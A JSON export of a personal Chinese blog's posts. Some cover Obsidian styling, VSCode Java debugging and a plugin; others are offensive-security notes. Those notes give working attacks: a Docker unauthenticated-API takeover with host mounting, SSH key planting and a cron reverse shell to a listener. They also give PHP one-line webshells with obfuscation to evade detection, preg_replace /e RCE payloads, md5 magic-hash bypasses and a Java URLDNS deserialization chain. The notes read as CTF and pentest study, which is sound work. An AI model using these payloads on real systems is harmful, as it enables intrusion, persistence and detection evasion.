[{"content":"Welcome to Hugo theme Stack. This is your first post. Edit or delete it, then start writing!\nFor more information about this theme, check the documentation: https://stack.jimmycai.com/\nWant a site like this? Check out hugo-theme-stack-stater\nPhoto by Pawel Czerwinski on Unsplash\n","date":"2022-03-06T00:00:00Z","image":"https://bu44er.ink/p/hello-world/cover_hu_e95a4276bf860a84.jpg","permalink":"https://bu44er.ink/p/hello-world/","title":"Hello World"},{"content":" 不是word不会，就是喜欢obsidian写 =)\n0.1 优雅的报告封面 用html仿照word的格式，熟练了还是很方便的。\n常用html语法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;h1 style=\u0026#34;font-size: 30px; text-align: center; color: #111111;margin-top: 100px; margin-bottom: 0px;\u0026#34;\u0026gt;学院\u0026lt;/h1\u0026gt; \u0026lt;h3 style=\u0026#34;font-size: 29px; text-align: center; font-family: \u0026#39;KaiTi\u0026#39;; font-weight: bold;color: #111111; margin-bottom: 100px;margin-top: 100px;\u0026#34;\u0026gt;操作系统设计与实践期末综合实验\u0026lt;/h3\u0026gt; \u0026lt;p style=\u0026#34;font-size: 18px; margin-left: 240px; text-align: left; color: #111111; margin-bottom: 100px; line-height: 2.5;\u0026#34;\u0026gt; 专 业 名 称 ：信息安全 \u0026lt;br\u0026gt; 课 程 名 称 ：操作系统设计与实践 \u0026lt;br\u0026gt; 学 生 姓 名 ：44 \u0026lt;/p\u0026gt; \u0026lt;p style=\u0026#34;font-size: 22px; width: fit-content; margin: 0 auto; text-align: left; color: #111111; margin-bottom: 0px;\u0026#34;\u0026gt;二○二四年十二月\u0026lt;/p\u0026gt; 封面效果：\n20241217\n正文用了css样式，强制修改了p和h1h2的样式，但是h6一般不用到，所以我在css样式中把h6的设置删去，封面可以全部用h6写，具体字体样式大小等可以像原来一样使用html语法设置。\n0.2 加上多级编号 插件1 serial：\n插件2 number title：\n效果：\n0.3 生成目录 插件：table of content\n注意：生成位置前面不能有任何标题 0.4 导出pdf 插件： better pdf\n优点：pdf目录点击能够跳转，可以加页脚 0.5 补充：css样式设置内容部分的报告/论文样式 参考： 【新手向教程】OB样式调整基础课：CSS入门科普 - 经验分享 - Obsidian 中文论坛 obsidian 有无适合中文学术/出版风格的主题？ - 疑问解答 - Obsidian 中文论坛 稍作修改，给样式加上了类名 paper，当需要该样式时，只要在文件的properties中指定一个cssclasses：paper 即可。 的property： 预览可见样式改变： 稍作修改后的paper.css\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 /* ---------------修改字体使css可以与Mac系统通用 ---------------- */ /* 编辑者：Dexter */ /* 编辑日期：20220908 */ /* 主要工作： */ /* 宋体 替换为PostScriptName格式：宋体-简, */ /* 黑体 替换为PostScriptName格式：黑体-简 */ /* 楷体 替换为PostScriptName格式：KaiTi */ /* Times New Roman 替换为PostScriptName格式：TimesNewRomanPSMT */ /* ------------------------------------------------------------ */ /* ------------------------------------------------------------ */ /* 原css作者：乔诚 */ /* 链接：https://forum-zh.obsidian.md/t/topic/2994/3 */ /* 修改：bu44er */ /* 修改日期: 20241217 */ /* ------------------------------------------------------------ */ .paper { box-shadow: none !important; background-color: #fff !important; } .paper p, .paper ul, .paper ol, .paper h1, .paper h2, .paper h3, .paper h4, .paper h5, .paper h6, .paper a, .paper strong, .paper sup, .paper .footnote-link, .paper .image-embed, .paper blockquote { color: #000000 !important; } .paper strong { font-family: \u0026#34;TimesNewRomanPSMT\u0026#34;,\u0026#34;黑体-简\u0026#34;; font-weight: bold; } .paper p { font-family: \u0026#34;TimesNewRomanPSMT\u0026#34;,\u0026#34;宋体-简\u0026#34; !important; text-decoration-line: none; margin: 0px 0px; line-height: 23pt; font-size: 17px; text-indent: 0em; } .paper h1 { font-family: \u0026#34;TimesNewRomanPSMT\u0026#34;,\u0026#34;黑体-简\u0026#34; !important; font-size: 24px !important; text-align: center !important; font-weight: bold !important; } .paper h2 { font-family: \u0026#34;TimesNewRomanPSMT\u0026#34;,\u0026#34;黑体-简\u0026#34; !important; font-weight: 700; font-size: 21px !important; text-align: left; font-weight: bold !important; } .paper h3 { font-family: \u0026#34;TimesNewRomanPSMT\u0026#34;,\u0026#34;黑体-简\u0026#34; !important; font-weight: 700; font-size: 19px !important; text-align: left; font-weight: bold !important; } .paper h4 { font-family: \u0026#34;TimesNewRomanPSMT\u0026#34;,\u0026#34;黑体-简\u0026#34; !important; font-weight: 700; font-size: 18px !important; text-align: left; font-weight: bold !important; } .paper h5 { font-family: \u0026#34;TimesNewRomanPSMT\u0026#34;,\u0026#34;宋体-简\u0026#34; !important; font-size: 20px !important; text-align: left !important; font-weight: bold; } .paper .footnote-link { color: #2E3338; line-height: 10px !important; } .paper sup { vertical-align: 25%; font-size: 10px; } .paper .image-embed { display: flex; align-items: center; justify-content: center; } .paper ul, .paper ol { font-family: \u0026#34;TimesNewRomanPSMT\u0026#34;,\u0026#34;宋体-简\u0026#34; !important; text-decoration-line: none; margin: 0px 0px; padding-left: 0; margin-left: 0; line-height: 23pt; font-size: 16px; text-indent: 0em !important; } .paper .markdown-preview-view table { width: 100%; margin-top: 12px; } .paper .markdown-preview-view td, .paper .markdown-preview-view th { border: none; font-size: 14px; padding: 4px 10px; } .paper .theme-light .markdown-preview-view th { border-bottom: 1px solid #272727; border-top: 1px solid #272727; font-weight: 800; background-color: #00000040; } .paper .theme-light .markdown-preview-view tr:nth-child(odd) { background-color: #00000030; } .paper .theme-light .markdown-preview-view tr:last-child { border-bottom: 1px solid #272727; } .paper .theme-dark .markdown-preview-view th { border-bottom: 2px solid #666666; border-top: 2px solid #999999; font-weight: 800; } .paper .theme-dark .markdown-preview-view tr:nth-child(odd) { background-color: #ffffff30; } .paper .theme-dark .markdown-preview-view tr:nth-child(even) { background-color: #ffffff20; } .paper .theme-dark .markdown-preview-view tr:last-child { border-bottom: 1px solid #999999; } .paper .markdown-preview-view blockquote th { vertical-align: bottom; } .paper .markdown-preview-view blockquote th, .paper blockquote tr { background-color: #00000000 !important; border: none !important; } .paper blockquote tr td { vertical-align: top; } .paper blockquote table tbody tr:first-child { font-family: \u0026#34;TimesNewRomanPSMT\u0026#34;,\u0026#34;宋体-简\u0026#34; !important; font-weight: bold; text-align: center; } .paper blockquote { border: none !important; padding: 0px; margin: 20px 50px; } .paper blockquote p { font-family: \u0026#34;KaiTi\u0026#34;,\u0026#34;TimesNewRomanPSMT\u0026#34;; } .paper .theme-light blockquote p { color: #5f5f5f; } .paper .theme-dark blockquote p { color: #a1a1a1; } /* .paper pre { border: solid 1px #000; } .paper code[class*=\u0026#34;language-\u0026#34;] { border-left: solid 5px #888 !important; border-radius: 0px; line-height: 1 !important; } */ .paper .markdown-preview-view hr { border: none; border-top: 1px solid; border-color: #000; } ","date":"2025-04-04T00:00:00Z","permalink":"https://bu44er.ink/p/%E5%A6%82%E4%BD%95%E7%94%A8obsidian%E5%86%99%E4%B8%80%E4%BB%BD%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E6%88%96%E8%AE%BA%E6%96%87/","title":"如何用obsidian写一份实验报告或论文"},{"content":"安装插件 VSCode 搜 Java，直接无脑把第一页的 Java 插件全装上，省事。\n配置 launch.json 来到运行和调试界面：\n建议创建 launch.json 文件，并配置。\n默认配置如下：\n其中 config 中每个对象分别对应左侧运行和调试栏顶部的一个选项：\n接下来我们添加一个config项 Launch with Arguments Prompt：\n这个选项可以在调试的时候输入参数，非常必要 直接在空白处输入 java 就会弹出选项，VSCode 会自动补全你想要的配置：\n之后就可以正常下断点，愉快的开始调试了。\n","date":"2025-01-23T23:16:31+08:00","permalink":"https://bu44er.ink/p/8286daf7/","title":"VSCode 调试 Java 项目"},{"content":"利用链 Java 反序列化漏洞的难点不在于发现，而在于如何利用 为了完成最终的危险操作，实战中的反序列化攻击往往需要结合很多 serialize 接口，形成复杂的调用链，这一过程非常繁琐。\n著名 Java 反序列化利用工具 ysoserial 集成了很多利用链，可以直接使用。\n1 java -jar ysoserial-all.jar ysoserial 的 payloads 稍微解释一下 ysoserial 源码中的 payloads 文件夹，之后分析利用链会用到。\npayloads 文件夹中每个文件就是一个 payload （一个公共类），每个 payload 类中都会定义一个getObject 方法，这个方法会返回一个对应 payload 的对象，该对象会在之后被 ysoserial 工具进一步处理，最终生成序列化的字节流。\n另外，每个 payload 文件（比如后文调试了 URLDNS.java ），都会写一个 main：\n其中这个 PayloadRunner.run 会干3件事：\n调用 getObject 生成序列化数据作为输出的 payload 本地反序列化测试生成的 payload 是否有效 所以，可以单独调试一个 payload.java 文件，来看这个 payload 实际反序列触发利用的过程。\nURLDNS 链 参数是一个 URL，结果是触发⼀次 DNS 请求。\n优点：\n使⽤ Java 内置的类构造，对第三⽅库没有依赖 在⽬标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞 调用链 从第一个 readObject 的反序列化进入，顺着函数中其他方法找下去，最终找到一个可能造成危害的函数进行注入利用。（建议直接看源码分析）\n1 2 3 4 * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() 源码分析 从 ysoserial payloads 中的 URLDNS.java 一步步调试分析。\n反序列化的入口点是 HashMap.readObject()，直接去看这个函数，其中 hash函数是关键的利用点，先打个断点，开始调试：\n注意，之前讲到 payload 文件主函数的 PayloadRunner 会干三件事，这边断点拦截到的是第三件事：反序列化，反序列化一定会触发 readObject。 步入 hash ：\n步入 hashCode:\n步入 handler.hashCode：\n步入 getHostAddress：\n最终找到 InetAddress.getByName(host) ，这个方法进行了 DNS 查询操作。\n单步执行之后可以在反连平台看到 DNS 查询：\nURL 类的 hashCode 很简单。如果 hashcode 不为 -1，则返回 hashcode。在序列化构造 payload 的时候，需要设置 hashcode 为 -1 的原因，就是防止进入到 hashcode 方法中，进而发送 DNS 请求，影响判断。\n","date":"2025-01-23T23:15:28+08:00","permalink":"https://bu44er.ink/p/315c5592/","title":"Java的URLDNS利用链"},{"content":" 参考谢公子：Site Unreachable 在实战中遇到了记一下，最终可以直接 ssh 登录 + 反弹 shell 到内网其他主机 测试过程 docker 未授权 nmap 扫描发现 2375 端口开放 docker 服务，测试以下 URL 发现 docker 未授权：\n1 2 3 http://x.x.x.x:2375/version http://x.x.x.x:2375/images http://x.x.x.x:2375/info docker 远程命令 可以在本地使用命令远程管理 docker：\n1 2 3 docker -H tcp://\u0026lt;IP\u0026gt;:2375 images -a docker -H tcp://\u0026lt;IP\u0026gt;:2375 ps docker -H tcp://\u0026lt;IP\u0026gt;:2375 exec -it e7d97caf249d /bin/bash 获取宿主机权限 容器里面操作没啥意义，关键是要获取宿主机（目标服务器）的权限。\n启动一个未开启的容器，然后将宿主机的磁盘挂载到容器中：\n1 docker -H tcp://\u0026lt;IP\u0026gt;:2375 run -it -v /:/opt b76f96a98a27 /bin/bash -v /:/opt：-v 选项的作用是选择挂载卷，此处将宿主机的整个文件系统 / 挂载到容器内的 /opt 目录下。 因此，我们可以通过容器内 /opt 目录，管理宿主机文件系统。\n写入SSH公钥 管理文件系统并不算真正获取权限，但是也快了。\n先在本地生成一对 SSH 的公私钥对，然后直接 echo 把 SSH 公钥写入服务器的公钥文件：\n1 2 3 4 5 6 7 8 # 本地生成公私钥对 ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa # 默认保存在 ~/.ssh , 私钥是 id_rsa , 公钥是 id_rsa.pub # 修改服务器文件：进入docker容器挂的宿主机文件系统 cd /opt/root/.ssh/ # echo 写入公钥（id_rsa.pub的内容） echo \u0026#34;ssh-rsa jdiofjsdoijfosjdsjfosdjfo...\u0026#34; \u0026gt;\u0026gt; authorized_keys 没有.ssh目录或者 authorized_keys 文件就自己创建一个 服务器写入公钥之后，本地可以直接通过指定私钥文件来登录服务器：\n1 ssh -i ~/.ssh/id_rsa root@\u0026lt;IP\u0026gt; 持久化 最后做一步权限维持，给宿主机设置定时任务。\n将反弹 shell 的命令写入 /var/spool/cron/root 文件中：\n也可能是 /var/spool/cron/crontab/root 1 2 cd /opt/var/spool/cron echo \u0026#34;*/1 * * * * /bin/bash -i\u0026gt;\u0026amp;/dev/tcp/\u0026lt;IPonListening\u0026gt;/4444 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; root 含义是每隔一分钟，反弹一次 shell 假如服务器默认 shell 是 zsh，需要把反弹 shell 命令改成：\n1 echo \u0026#34;*/1 * * * * bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;IPonListening\u0026gt;/10341 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt;\u0026gt; root 注意，目标服务器可能出不了网，只能反弹 shell 到内网，需要有一台内网机器，可以之后再由内网机器配置转发到外网。\n","date":"2025-01-22T23:20:26+08:00","permalink":"https://bu44er.ink/p/c767958d/","title":"Docker未授权致RCE"},{"content":" github：GitHub - cynicalight/obsidian-image-size: Set the default size for pasted images. 参考：Build a plugin - Developer Documentation obsidian默认粘贴的图片的宽度总是占满笔记宽度的，我在粘贴一些网课的ppt的时候总是感觉这种默认设置显得图片太大了，当然，我可以直接修改图片的md链接在方括号中写一个大小，比如400，但是每次改太麻烦了，我希望有一个默认粘贴图片宽度的预设，于是写了这个简单的插件 Image Size，真的非常简单\u0026hellip;\n实现这一目的的主要过程就是以下两步：\n阻止系统的默认粘贴： 1 2 3 4 5 6 // 阻止默认粘贴行为 if (items) { for (let i = 0; i \u0026lt; items.length; i++) { const item = items[i]; if (item.type.startsWith(\u0026#34;image/\u0026#34;)) { evt.preventDefault(); 调用obsidian的editor自己插入一个图片（md语句）： 1 2 3 4 // 插入 Markdown 图片链接 const cursor = editor.getCursor(); const markdownImage = `![${this.settings.imageSize}](${imageNameMd})`; editor.replaceRange(markdownImage, cursor); 由于阻止了默认的粘贴，所以我需要再写一个保存图片文件到设置的附件文件夹的操作，这里就不展示了。 20240320 在提交社区review的时候，按照他们的要求改了挺多的，详见github。\n","date":"2024-12-09T14:15:03+08:00","permalink":"https://bu44er.ink/p/74665601/","title":"自制obsidian插件 Image Size: 设置默认粘贴图片的尺寸"},{"content":"基础 \u0026lt;?php @eval($_POST['shell']);?\u0026gt;\n@ 防止报错 eval() 把字符串当作php代码执行 $_POST['xyz'] 以post方式获取名为xyz的变量 使用：访问这句木马所在的php文件，以post方式传入 xyz = phpinfo()\n网页会（执行phpinfo() 这个函数）返回网页php的版本信息 变形 assert 1 2 3 4 \u0026lt;?php $a = \u0026#34;assert\u0026#34;; $a(@$_POST[\u0026#39;shell\u0026#39;]); ?\u0026gt; 区别在于 assert 函数在执行给定代码时，要求代码的结果为布尔类型，而 eval 函数则可以执行任意有效的 PHP 代码 字符变形 使用字符串拼接、大小写混淆、字符串逆序组合而成\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php $a=\u0026#34;TR\u0026#34;.\u0026#34;Es\u0026#34;.\u0026#34;sA\u0026#34;; $b=strtolower($a); $c=strrev($b); @$c($_POST[\u0026#39;shell\u0026#39;]); ?\u0026gt; # phpinfo(); \u0026lt;?php $a=\u0026#34;of\u0026#34;.\u0026#34;NiP\u0026#34;.\u0026#34;Hp\u0026#34;; $b=strtolower($a); $c=strrev($b); @$c(); ?\u0026gt; strtolower() 是 PHP 中的一个内置函数，用于将字符串转换为小写字母 strrev() 字符串反转 注意，字符变形仅仅用于函数名，不能写成 $a=\u0026quot;)(of\u0026quot;.\u0026quot;NiP\u0026quot;.\u0026quot;Hp\u0026quot;; ，不能把括号一起放入。\n用解析出来的变量替代函数名，本质上只是字符的替换，绕过黑名单检测，最后“触发”函数的执行需要依赖括号 () 。假如括号也写在字符变形之中，最终由变量替换产生一串 phpinfo() 这样的字符串，php 显然不会执行这个字符串，所以必须把括号放在外面。\n自定义函数 1 2 3 4 5 6 \u0026lt;?php function fun($a){ @eval($a); } @fun($_POST[\u0026#39;shell\u0026#39;]); ?\u0026gt; create_function 1 2 3 4 \u0026lt;?php $fun = create_function(\u0026#39;\u0026#39;,$_POST[\u0026#39;shell\u0026#39;]); $fun(); ?\u0026gt; 用法：$addFunction = create_function('参数', '函数体'); base64_decode 函数 1 2 3 4 \u0026lt;?php $a=base64_decode(\u0026#34;YXNzZXJ0\u0026#34;); @a($_POST[\u0026#39;shell\u0026#39;]); ?\u0026gt; YXNzZXJ0是assert的base64编码，base64_decode()是base64解密函数\n绕过\u0026lt;? GIF89a? \u0026lt;script language=\u0026quot;php\u0026quot;\u0026gt;eval($_REQUEST[123])\u0026lt;/script\u0026gt; GIF89a: 这是 GIF 图像文件的文件头标识符 剩余就是正常的html语言 短标签 short_open_tag 开启以后，可以使用 PHP 的短标签：\u0026lt;? ?\u0026gt;\n绕过黑名单有 php 的情况 ","date":"2024-10-13T15:27:04+08:00","permalink":"https://bu44er.ink/p/0dixy59j/","title":"php一句话木马以及相关免杀"},{"content":"常见函数 is_numeric() 判断是否为数字\n1 2 3 4 5 6 7 8 9 $var1 = 123; $var2 = \u0026#34;3.14\u0026#34;; $var3 = \u0026#34;abc\u0026#34;; $var4 = \u0026#34;123abc\u0026#34;; echo is_numeric($var1); // 输出：1（true） echo is_numeric($var2); // 输出：0（false） echo is_numeric($var3); // 输出：0（false） echo is_numeric($var4); // 输出：0（false） intval() 字符串转换成十进制整数\n1 2 3 4 5 6 echo intval(\u0026#34;123\u0026#34;); // 输出: 123 echo intval(\u0026#34;+123\u0026#34;); // 输出: 123 echo intval(\u0026#34;123.45\u0026#34;); // 输出: 123 echo intval(\u0026#34;123abc\u0026#34;); // 输出: 123 echo intval(\u0026#34;abc123\u0026#34;); // 输出: 0 echo intval(\u0026#34;12.3abc45\u0026#34;); // 输出: 12 如果字符串以数字开头，则为开头的数字 如果字符串以非数字开头，则为0 PHP5 的 intval 不识别科学计数 1 if(intval($num) \u0026lt; 2020 \u0026amp;\u0026amp; intval($num + 1) \u0026gt; 2021) {} payload: ?num=100e2\n在PHP5中， intval 不识别科学计数，遇到 e 直接结束，intval(\u0026quot;100e2\u0026quot;) 会被识别成 100\n后续版本中，科学计数字符串转数字时会被自动识别成相应数字 1 2 echo intval(1e10); // 10000000000 echo intval(\u0026#39;1e10\u0026#39;); // 10000000000 base 参数 1 int intval ( mixed $var [, int $base = 10 ] ) 如果有第二个base参数 x，表示把第一个字符串参数看成x进制。\n如果 base参数 = 0，通过检测 var 的格式来决定使用的进制：\n如果字符串包括了 \u0026ldquo;0x\u0026rdquo; (或 \u0026ldquo;0X\u0026rdquo;) 的前缀，使用 16 进制 (hex)；否则， 如果字符串以 \u0026ldquo;0\u0026rdquo; 开始，使用 8 进制(octal)；否则， 将使用 10 进制 (decimal)。 show_source() 显示指定文件的源代码\nvar_dump() 打印变量的详细信息，包括变量的类型和值\nscandir() 获取指定目录\nscandir(/) 获取根目录 chr() 将 ASCII 码转换为对应的字符\n可拼接：file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) file_get_contents() 获取指定路径的文件的内容\neval() 将字符串作为php代码执行\neval()是一个语言构造器，不能被可变函数调用\n1 2 3 4 5 eval(eval(...)) #错误 eval(assert(eval(...))) #正确 \u0026lt;?php assert(POST[\u0026#39;a\u0026#39;]) ;\u0026gt; #错误 #由于php版本问题，也不能直接用assert构造一句话，所以只能采用eval(assert(eval(...))) sizeof 返回数组长度\npreg_match [[../../../编程语言/正则表达式]] 1 preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int \u0026amp;$count ]] ) 搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。\n$pattern: 要搜索的模式，可以是字符串或一个字符串数组。 $replacement: 用于替换的字符串或字符串数组。 $subject: 要搜索替换的目标字符串或字符串数组。 /e 模式 preg_replace /e 模式下存在 RCE，php 7 被删除\n实战 注入环境：\n1 preg_replace( \u0026#39;/(\u0026#39; . $key . \u0026#39;)/ei\u0026#39;, \u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $value ); key、value 是 GET 传入的键值对 /ei 表示替换内容当作 php 执行 payload1：\n1 ?\\S*=${phpinfo()} \\S 利用 GET 上传的非法字符解析原理，解析成 . .* 是 key，${phpinfo()} 是 value .* 贪婪匹配任意字符任意次，匹配 ${phpinfo()} php 执行 strtolower(\u0026quot;{${phpinfo()}}\u0026quot;) 原理如下 payload2：\n1 2 3 4 5 6 7 8 ?\\S*=${eval($_POST[cmd])} // 再 POST 一个参数 cmd=system(\u0026#34;cat /flag\u0026#34;); // 或者解析一个题目给出的可以利用的函数 // function getFlag(){ // @eval($_GET[\u0026#39;cmd\u0026#39;]); // } ?\\S*=${getFlag()}\u0026amp;cmd=system(\u0026#34;ls\u0026#34;); 原理 1 2 3 4 5 6 7 8 9 10 11 12 13 var_dump(phpinfo()); // 结果：布尔 true var_dump(strtolower(phpinfo()));// 结果：字符串 \u0026#39;1\u0026#39; // 先执行 phpinfo 得到返回值是 1，再 strtolower(\u0026#34;1\u0026#34;) 返回值是 1 var_dump(preg_replace(\u0026#39;/(.*)/ie\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;{${phpinfo()}}\u0026#39;));// 结果：字符串\u0026#39;11\u0026#39; // 先解析 {${phpinfo()}}，其中 phpinfo 返回 1， 解析得 {$1} // var_dump(preg_replace(\u0026#39;/(.*)/i\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;任意字符\u0026#39;)); 返回 11 var_dump(preg_replace(\u0026#39;/(.*)/ie\u0026#39;,\u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;,\u0026#39;{${phpinfo()}}\u0026#39;));// 结果：空字符串\u0026#39;\u0026#39; var_dump(preg_replace(\u0026#39;/(.*)/ie\u0026#39;,\u0026#39;strtolower(\u0026#34;{${phpinfo()}}\u0026#34;)\u0026#39;,\u0026#39;{${phpinfo()}}\u0026#39;));// 结果：空字符串\u0026#39;\u0026#39; // 这里的\u0026#39;strtolower(\u0026#34;{${phpinfo()}}\u0026#34;)\u0026#39;执行后相当于 strtolower(\u0026#34;{${1}}\u0026#34;) 又相当于 strtolower(\u0026#34;{null}\u0026#34;) 又相当于 \u0026#39;\u0026#39; 空字符串 php 正则反斜杠过滤问题 preg_match 匹配反斜杠需要四个反斜杠：\n1 2 preg_match(\u0026#34;/\\\\\\\\/\u0026#34;, $str1) // preg_match(\u0026#34;/\\\\/\u0026#34;, $str1) 无效 原理：先由 php 解析器解析成\\\\ ，再由正则匹配解析成\\ 再看一个特殊的：\n1 preg_match(\u0026#34;/\\\\|\\\\\\\\/\u0026#34;, $str2) 这个匹配的是 |\\ 先由 php 解析器解析为 \\|\\\\ ，再由正则解析为 `|\\\n技巧 读取文件新姿势 highlight 高亮输出 highlight 高亮输出 + glob 搜索并返回第一个元素\n1 eval(\u0026#34;highlight_file(glob(\u0026#34;/f*\u0026#34;)[0]);\u0026#34;) highlight_file 是 php 的函数 无特殊字符的纯函数读取 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # ls scandir(current(localeconv())) # localecnov() 函数返回一个包含本地数字及货币格式信息的数组。相当于Linux的ls # current() 返回数组中当前元素的值 # scandir()就是列出目录中的文件和目录 # 打印 print_r(); print_r(scandir(current(localeconv()))); # 查看调试信息 # 定位 # array_reverse() 反转数组 # next() 指向下一个 (第二个) next(array_reverse(scandir(current(localeconv())))) # 此处指倒数第二个数组元素 # payload # highlight 读取文件 highlight_file(next(array_reverse(scandir(current(localeconv()))))); 弱比较 == 是PHP弱比较逻辑运算符\n整数 和 字符串 的弱比较 尝试将字符串转换为整数，规则同 intval()，再比大小\n123a == 123 例如，payload为123a可以绕过 is_numeric函数 弱比较和强比较的区别 1 2 3 == 和 != 左右两边数据类型不同时，会将他们转化成同一格式进行比较。 === 和 !== 左右两边数据类型不同时，则返回false 科学记数法 用于限制数字长度的题 1000000000 = 1e9\n绕过md5 数组绕过 md5无法比较数组，对于数组，md5会返回NULL，所以相等，可以绕过比较\n返回null，在强比较里面null=null也为 True，所以也可以绕过强比较 实例 1 2 3 4 5 6 7 \u0026lt;!-- $a = $_GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)){ //flag --\u0026gt; payload：\n1 2 3 ?a[]=1\u0026amp;b[]=2 # md5($a) == md5($b) returns true 科学计数绕过 只能绕过弱比较==，不能绕过=== 原理：在 php 中，当字符串以0e开头时，会被 php 识别成==科学计数法==，结果均为0，因此在比较两个以 0e 开头的字符串时，无论后面的字符时是什么，比较结果都为 True。\n所以关键在于找到md5值为0e开头的字符串 常用 MD5 值以 0e 开头的字符串：\n字符串 MD5 值 QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e342768416822451524974117254469 0e215962017 0e291242476940776845150308577824 最后一个很特殊，原字符串和 md5 值都是 0e 开头，可以绕过 md($a) == $a 的情况 更多： GitHub - spaze/hashes: Magic hashes – PHP hash \u0026ldquo;collisions\u0026rdquo; payload：\n1 2 3 ?a=QNKCDZO\u0026amp;b=s878926199a # md5($a) == md5($b) returns true md5 碰撞 fastcoll 找到两个真实的 md5 值一样的字符串绕过对字符串 md5 的强等于条件。\n最终找到的两个 md5 值一样的字符串一般是乱码，需要经过 urlencode 再POST给服务器。\nhackbar 不能直接 post 经过 URL编码之后的数据，必须通过 burp 发包 hackbar 直接输入的是原始数据，会在发包的时候经过一次 URL 编码，所以直接在 hackbar 输入 URL 编码之后的数据会再次被 URL 编码，导致出错 收集：\n1 2 TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak 哈希长度拓展攻击 工具目录：/Users/jz/Code/CTF/tools/attack-scripts/logic 使用工具，攻击者能够根据已知哈希值、原始消息长度、结尾需要附加的新数据，计算出原始消息需要附加的完整附加数据以及整个消息的新哈希值。\n原理：利用填充函数将消息扩展为压缩函数能处理的固定长度的倍数 所以不能仅仅附加需要的数据，只能做到以所要求的数据结尾 ==原始消息需要附加的完整附加数据 是 包含结尾需要附加的新数据的更长的字符串== 在原始消息的基础上，不是仅仅附加了需要附加的新数据，是附加了一串更长的数据，需要附加的完整新数据最终可以做到以所要求的新数据结尾，所以整个完整的消息也是以所要求的新数据结尾 判断 php 生成字符串长度 1 $str = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)); randomb_bytes 生成 16 字节 bin2hex 对每个字节生成两个16进制字符 得到32个字符 三个拼接得到96个字符 php字符串解析特性 removes initial whitespace converts some characters to underscore (including whitespace) USER INPUT DECODED PHP VARIABLE NAME %20foo_bar%00 foo_bar foo_bar foo%20bar%00 foo bar foo_bar foo%5bbar foo[bar foo_bar 绕过WAF 可以在用户输入时，利用字符串解析特性输入变形后的变量，导致php语法中可以正常检测到（传入的get/post）变量，同时，WAF等检测规则（waf等不具有php字符串解析特性）无法识别到相应黑名单/block规则中的变量，形成bypass\n实例 对于一个存在检测是否是数字的WAF，传入变量为num，可以构造payload：?%20num=phpinfo()\n%20num 在php语法中，被解析成num变量，进入后续的eval木马中执行相应的注入代码 %20num 在WAF检测中，无法被解析成num，故对num的检测没有执行，发生bypass public、protected、private的区别 public 表示全局，类内部外部子类都可以访问；\n**private表示私有的，只有本类内部可以使用； ** protected表示受保护的，只有本类或子类或父类中可以访问\n魔术方法 PHP中把以两个下划线 __ 开头的方法称为魔术方法(Magic methods)\n1 2 3 4 5 6 7 8 __construct() 当一个对象创建时被调用，反序列化不触发 __destruct() 当一个对象销毁时被调用 __toString() 当一个对象被当作一个字符串使用，比如echo输出或用 . 和字符串拼接 __call() 当调用的方法不存在时触发 __invoke() 当一个对象被当作函数调用时触发 __wakeup() 反序列化时自动调用 __get() 类中的属性私有或不存在触发 __set() 类中的属性私有或不存在触发 非法参数名传参 谈一谈PHP中关于非法参数名传参问题_arr4y非法传参-CSDN博客 注意：只发送在PHP版本小于8时，当PHP版本大于等于8并不会出现以下介绍的转换错误 当变量名中出现 . 和 空格 时，PHP 会把它们转换成下划线\n但是，如果参数中出现中括号[，中括号会被转换成下划线_，接下来如果该参数名中还有非法字符 并不会继续转换成下划线_，忽略后面所有错误。\n实例 1 2 3 4 5 $zj = $_REQUEST[\u0026#39;z j.\u0026#39;]; # 传入参数 $zj 实际变量 # ?z j.=1 NULL z_j_ # ?z[j.=1 NULL z_j. 当传入 ?z j.=1 时，虽然 $zj 变量仍然是空的，但是存在 $_REQUEST['z_j_'] $_GET 会自动对参数调用 urldecode，所以得到的参数键值对的数组中的值都是字符串。 php 伪协议 伪协议是一种特殊的协议，用于访问不同的数据源。\n它们并不是真正的网络协议，而是一种封装协议，使得PHP能够以特定的方式访问和操作数据。 